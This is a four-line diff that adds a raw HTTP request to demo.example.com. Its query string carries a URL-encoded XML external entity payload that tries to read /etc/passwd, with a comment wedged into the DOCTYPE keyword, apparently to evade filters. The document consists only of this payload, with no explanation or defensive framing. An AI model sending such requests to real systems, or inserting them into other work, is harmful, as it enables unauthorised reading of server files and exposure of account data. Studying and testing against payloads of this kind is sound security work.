@@ -1,0 +1,4 @@
+GET /a?page=<!/*x*/DOCTYPE%20r%20[<!ENTITY%20x%20PUBLIC%20"-//X//Y"%20"file:///etc/passwd">]><r>%26x;</r> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
